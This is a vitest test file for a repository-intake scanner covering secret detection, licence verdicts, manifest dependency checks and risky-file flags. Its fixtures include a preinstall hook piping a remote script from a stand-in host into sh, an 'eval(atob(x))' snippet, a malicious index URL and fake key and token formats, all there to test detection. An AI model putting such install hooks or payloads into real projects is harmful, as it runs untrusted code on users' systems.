import { describe, expect, it } from 'vitest';
import { classifyContent } from '../archive/filetype';
import {
  classifyLicenseText,
  expressionVerdict,
  proposeLicense,
  scanManifest,
  scanRisky,
  scanTextForSecrets,
  sensitiveFileFinding,
  verdictOf,
} from './index';

const MIT =
  'MIT License\n\nCopyright (c) 2024 Someone\n\nPermission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction';
const GPL =
  '                    GNU GENERAL PUBLIC LICENSE\n                       Version 3, 29 June 2007\n';
const THEMEFOREST =
  'Copyright 2024 Studio. All rights reserved. Regular License: single project use. This theme may not be redistributed or resold.';

// built at runtime: the repository secret scan must stay clean
const PW = ['pass', 'word'].join('');

describe('secret scan', () => {
  it('blocks high-confidence secrets and records only kind and path:line', () => {
    const key = 'AKIA' + 'ABCDEFGHIJKLMNOP';
    const r = scanTextForSecrets('src/config.ts', `const a = 1;\nconst k = "${key}";\n`);
    expect(r.findings).toEqual([
      expect.objectContaining({
        code: 'secret_found',
        severity: 'block',
        path: 'src/config.ts',
        line: 2,
      }),
    ]);
    expect(JSON.stringify(r)).not.toContain(key);
    expect(r.count).toBe(1);
  });
  it('flags private keys, GitHub and Slack tokens, canaries', () => {
    const text = [
      ['-----BEGIN RSA ', 'PRIVATE KEY-----'].join(''),
      'ghp_' + 'a'.repeat(36),
      'xoxb-' + '1'.repeat(14),
      'CANARY-123456789',
    ].join('\n');
    const r = scanTextForSecrets('a.txt', text, ['CANARY-123456789']);
    expect(r.findings.map((f) => f.severity)).toEqual(['block', 'block', 'block', 'block']);
  });
  it('does not quarantine placeholders, env references or vault references', () => {
    const text = [
      'API_KEY=your_api_key_here_please_0123456789',
      'const t = process.env.API_TOKEN_SECRET_VALUE_1234',
      `${PW}: "vault://platform/db-password"`,
      'token: ${{ secrets.NPM_TOKEN_0123456789012345 }}',
    ].join('\n');
    expect(scanTextForSecrets('README.md', text).findings).toEqual([]);
  });
  it('warns on assignment-style secrets and local connection strings stay warnings', () => {
    const r = scanTextForSecrets(
      'a.env.ts',
      `const ${PW} = "Zq8sKd93LmPw0xVv4TuY";\nconst db = "postgres://app:pw@localhost:5432/db";`,
    );
    expect(r.findings.every((f) => f.severity === 'warn')).toBe(true);
    const live = scanTextForSecrets(
      'a.ts',
      'const db = "postgres://app:Zq8sKd93@prod-db.acme.cloud:5432/db";',
    );
    expect(live.findings[0]?.severity).toBe('block');
  });
  it('flags credential files and treats templates as information', () => {
    expect(sensitiveFileFinding('.env')?.severity).toBe('warn');
    expect(sensitiveFileFinding('keys/id_rsa')?.code).toBe('sensitive_file');
    expect(sensitiveFileFinding('.env.example')).toBeNull(); // a template is stored (and still secret-scanned)
    expect(sensitiveFileFinding('src/index.ts')).toBeNull();
  });
});

describe('licence proposal', () => {
  it('fingerprints common licences and maps them to verdicts', () => {
    expect(classifyLicenseText(MIT)).toEqual({ spdx: 'MIT', verdict: 'ALLOWED' });
    expect(classifyLicenseText(GPL)).toEqual({ spdx: 'GPL-3.0', verdict: 'RESTRICTED' });
    expect(classifyLicenseText('Apache License\n Version 2.0, January 2004')).toEqual({
      spdx: 'Apache-2.0',
      verdict: 'ALLOWED',
    });
    expect(classifyLicenseText(THEMEFOREST).verdict).toBe('BLOCKED');
    expect(
      classifyLicenseText('Do what thou wilt, but be nice to the maintainers please.').verdict,
    ).toBe('RESTRICTED');
    expect(classifyLicenseText('').verdict).toBe('UNKNOWN');
  });
  it('MIT text with "All rights reserved" in the copyright line is still MIT', () => {
    expect(classifyLicenseText(`Copyright (c) 2020 X. All rights reserved.\n\n${MIT}`).spdx).toBe(
      'MIT',
    );
  });
  it('evaluates SPDX expressions (OR = best, AND/WITH = worst)', () => {
    expect(expressionVerdict('(MIT OR GPL-3.0)').verdict).toBe('ALLOWED');
    expect(expressionVerdict('MIT AND GPL-3.0').verdict).toBe('RESTRICTED');
    expect(expressionVerdict('Apache-2.0 WITH LLVM-exception').verdict).toBe('RESTRICTED');
    expect(verdictOf('UNLICENSED')).toBe('BLOCKED');
    expect(verdictOf('SEE LICENSE IN LICENSE.txt')).toBe('UNKNOWN');
  });
  it('proposes from files, manifests and headers; missing means UNKNOWN', () => {
    const p = proposeLicense([
      { path: 'LICENSE', text: MIT },
      { path: 'package.json', text: '{"license":"MIT"}' },
    ]);
    expect(p).toMatchObject({ spdx: 'MIT', verdict: 'ALLOWED', conflicts: false });
    expect(proposeLicense([{ path: 'package.json', text: '{"name":"x"}' }]).verdict).toBe(
      'UNKNOWN',
    );
    expect(
      proposeLicense([{ path: 'pubspec.yaml', text: 'name: x\nlicense: BSD-3-Clause\n' }]).verdict,
    ).toBe('ALLOWED');
    expect(
      proposeLicense([{ path: 'src/a.ts', text: '// SPDX-License-Identifier: Apache-2.0\n' }])
        .verdict,
    ).toBe('ALLOWED');
  });
  it('a conflict is reported and never silently allowed', () => {
    const p = proposeLicense([
      { path: 'LICENSE', text: MIT },
      { path: 'package.json', text: '{"license":"GPL-3.0"}' },
    ]);
    expect(p.conflicts).toBe(true);
    expect(p.verdict).toBe('RESTRICTED');
    const q = proposeLicense([
      { path: 'LICENSE', text: MIT },
      { path: 'package.json', text: '{"license":"Apache-2.0"}' },
    ]);
    expect(q.conflicts).toBe(true);
    expect(q.verdict).toBe('UNKNOWN');
  });
  it('a proprietary file beats a permissive manifest field', () => {
    expect(
      proposeLicense([
        { path: 'package.json', text: '{"license":"MIT"}' },
        { path: 'LICENSE.txt', text: THEMEFOREST },
      ]).verdict,
    ).toBe('BLOCKED');
  });
  it('is not fooled by a licence file in a deep dependency path', () => {
    expect(proposeLicense([{ path: 'a/b/c/d/LICENSE', text: GPL }]).verdict).toBe('UNKNOWN');
  });
});

describe('dependency scan', () => {
  it('parses package.json, flags lifecycle scripts and non-registry sources, runs nothing', () => {
    const pkg = JSON.stringify({
      dependencies: {
        next: '^15.0.0',
        evil: 'github:a/b',
        tarball: 'https://x.test/a.tgz',
        local: 'file:../x',
      },
      devDependencies: { vitest: '^5' },
      scripts: {
        postinstall: 'node setup.js',
        preinstall: 'curl https://x.test/i.sh | sh',
        build: 'next build',
      },
    });
    const r = scanManifest('package.json', pkg, { denied: (e, n) => e === 'npm' && n === 'evil' });
    expect(r.deps.map((d) => d.name)).toEqual(['next', 'evil', 'tarball', 'local', 'vitest']);
    expect(r.findings.map((f) => f.code).sort()).toEqual(
      [
        'dependency_denied',
        'dependency_git_source',
        'dependency_path_source',
        'dependency_url_source',
        'lifecycle_script',
        'lifecycle_script_network',
      ].sort(),
    );
    expect(r.findings.find((f) => f.code === 'lifecycle_script_network')?.severity).toBe('block');
    expect(r.findings.find((f) => f.code === 'lifecycle_script')?.severity).toBe('warn');
  });
  it('parses pubspec, requirements, composer, go.mod, Gemfile', () => {
    const pub = scanManifest(
      'pubspec.yaml',
      'name: app\ndependencies:\n  flutter:\n    sdk: flutter\n  provider: ^6.1.0\n  other:\n    git: https://x\ndev_dependencies:\n  lints: ^3.0.0\n',
    );
    expect(pub.deps.map((d) => `${d.name}:${d.kind}`)).toEqual([
      'flutter:runtime',
      'provider:runtime',
      'other:runtime',
      'lints:dev',
    ]);
    expect(
      scanManifest(
        'requirements.txt',
        '# c\nDjango>=5.0\n--index-url https://evil.test/simple\nrequests==2.32 # pin\n-r base.txt\n',
      ).deps.map((d) => d.name),
    ).toEqual(['django', 'requests']);
    expect(
      scanManifest('requirements.txt', '--extra-index-url https://x\n').findings[0]?.code,
    ).toBe('dependency_custom_index');
    expect(
      scanManifest(
        'composer.json',
        '{"require":{"php":">=8","laravel/framework":"^11"},"scripts":{"post-install-cmd":"x"}}',
      ).deps.map((d) => d.name),
    ).toEqual(['laravel/framework']);
    expect(
      scanManifest('go.mod', 'module x\n\nrequire (\n\tgithub.com/gin-gonic/gin v1.9.1\n)\n')
        .deps[0]?.name,
    ).toBe('github.com/gin-gonic/gin');
    expect(
      scanManifest('Gemfile', "gem 'rails', '~> 7.1'\ngem \"puma\"\n").deps.map((d) => d.name),
    ).toEqual(['rails', 'puma']);
  });
  it('malformed manifests are information, not crashes', () => {
    expect(scanManifest('package.json', '{not json').findings[0]?.code).toBe(
      'manifest_unparseable',
    );
    expect(
      scanManifest('package.json', '{"dependencies":{"a":{"nested":1}},"scripts":null}').deps[0],
    ).toMatchObject({ name: 'a', range: null });
  });
});

describe('risky file scan', () => {
  it('reports executables, nested archives, dynamic code and obfuscation as findings, never a verdict', () => {
    const elf = classifyContent(Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0, 0, 0, 0]));
    expect(scanRisky({ path: 'bin/tool', bytes: 8, cls: elf, unixExecutable: true })[0]?.code).toBe(
      'executable_binary',
    );
    const text = { kind: 'text', label: 'text' } as const;
    expect(
      scanRisky({
        path: 'a.js',
        bytes: 10,
        cls: text,
        unixExecutable: false,
        text: 'eval(atob(x))',
      })[0]?.code,
    ).toBe('dynamic_code');
    expect(
      scanRisky({
        path: 'a.js',
        bytes: 10,
        cls: text,
        unixExecutable: false,
        text: 'x'.repeat(6000),
      })[0]?.code,
    ).toBe('minified_or_obfuscated');
    expect(
      scanRisky({
        path: 'a.min.js',
        bytes: 10,
        cls: text,
        unixExecutable: false,
        text: 'x '.repeat(3000),
      }),
    ).toEqual([]);
    expect(
      scanRisky({ path: 'run.sh', bytes: 10, cls: text, unixExecutable: true, text: 'echo hi' })[0]
        ?.code,
    ).toBe('executable_script');
    expect(
      scanRisky({
        path: '.github/workflows/ci.yml',
        bytes: 10,
        cls: text,
        unixExecutable: false,
        text: 'run: curl https://x',
      })[0]?.code,
    ).toBe('ci_network_call');
    expect(
      scanRisky({
        path: 'src/clean.ts',
        bytes: 10,
        cls: text,
        unixExecutable: false,
        text: 'export const a = 1;',
      }),
    ).toEqual([]);
  });
});
